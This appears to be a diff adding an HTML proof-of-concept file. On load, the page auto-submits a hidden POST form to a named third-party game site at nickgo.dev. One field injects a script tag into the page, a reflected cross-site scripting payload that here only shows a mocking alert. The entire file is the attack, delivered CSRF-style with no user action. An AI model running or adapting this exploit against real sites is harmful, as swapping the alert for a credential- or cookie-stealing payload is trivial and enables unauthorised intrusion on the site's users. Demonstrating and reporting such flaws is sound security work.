@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+<body>
+    <form id="sendThingy" action="https://nickgo.dev/games/nonogram/" method="POST">
+        <input type="hidden" name="x" value="5">
+        <input type="hidden" name="y" value="5">
+        <input type="hidden" name="g" value='3><script>alert("NICK HAS BEEN XSSed")</script>'>
+    </form>
+    <script>
+        document.getElementById("sendThingy").submit();
+    </script>
+</body>
+
+</html>
